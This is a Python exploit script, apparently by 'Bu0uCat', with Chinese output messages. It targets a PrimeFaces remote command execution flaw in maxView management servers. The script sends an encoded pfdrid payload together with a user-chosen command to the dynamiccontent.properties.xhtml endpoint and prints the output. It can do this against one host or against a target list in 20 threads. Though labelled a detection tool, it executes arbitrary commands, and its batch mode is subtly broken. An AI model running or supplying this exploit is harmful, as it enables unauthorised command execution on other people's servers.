import requests
import concurrent.futures
import argparse


def check_vulnerability(target,cmd):

    headers = {"User-Agent":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",
               "Connection":"close","Content-Type":"application/x-www-form-urlencoded","Accept-Encoding":"gzip"}
    data = f'pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd={cmd}'

    try:
        res = requests.post(f"{target}/maxview/manager/javax.faces.resource/dynamiccontent.properties.xhtml",
                            headers=headers,data=data,timeout=5,verify=False)
        if res.status_code == 200 and res.text:
            # if "system" in res.text:
            print(f"\033[1;32m[+]目标网站{target}存在命令执行漏洞,命令执行结果为:{res.text}" + "\033[0m")
            # else:
            #     print(f"[-]目标网站{target}不存在命令执行漏洞!")
        else:
            print(f"\033[1;31m[-]目标网站{target}不存在命令执行漏洞!" + "\033[0m")
    except Exception:
        print(f"\033[1;31m[-] 连接{target}时发生了问题!" + "\033[0m")


def banner():
    print("""  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| | ____    ____ | || |      __      | || |  ____  ____  | || | ____   ____  | || |     _____    | || |  _________   | || | _____  _____ | |
| ||_   \  /   _|| || |     /  \     | || | |_  _||_  _| | || ||_  _| |_  _| | || |    |_   _|   | || | |_   ___  |  | || ||_   _||_   _|| |
| |  |   \/   |  | || |    / /\ \    | || |   \ \  / /   | || |  \ \   / /   | || |      | |     | || |   | |_  \_|  | || |  | | /\ | |  | |
| |  | |\  /| |  | || |   / ____ \   | || |    > `' <    | || |   \ \ / /    | || |      | |     | || |   |  _|  _   | || |  | |/  \| |  | |
| | _| |_\/_| |_ | || | _/ /    \ \_ | || |  _/ /'`\ \_  | || |    \ ' /     | || |     _| |_    | || |  _| |___/ |  | || |  |   /\   |  | |
| ||_____||_____|| || ||____|  |____|| || | |____||____| | || |     \_/      | || |    |_____|   | || | |_________|  | || |  |__/  \__|  | |
| |              | || |              | || |              | || |              | || |              | || |              | || |    Bu0uCat   | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
                                                                                                                            By:Bu0uCat                                                                                                               
""")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="这是一个maxView系统远程命令执行检测程序")
    parser.add_argument("-t", "--target",type=str, help="需要检测的目标URL")
    parser.add_argument("-f","--file",type=str,help="需要批量检测的文件")
    parser.add_argument("-c","--cmd",type=str,default='whoami',help="需要执行的命令")
    args = parser.parse_args()

    if args.target:
        banner()
        check_vulnerability(args.target,args.cmd)
    elif args.file:
        banner()
        f = open(args.file, 'r')
        targets = f.read().splitlines()
        # 使用线程池并发执行检查漏洞
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_vulnerability, targets,args.cmd)
    else:
        banner()
        print("-t,--target 指定需要检测的URL")
        print("-f,--file 指定需要批量检测的文件")
        print("-c,--cmd 指定需要执行的命令")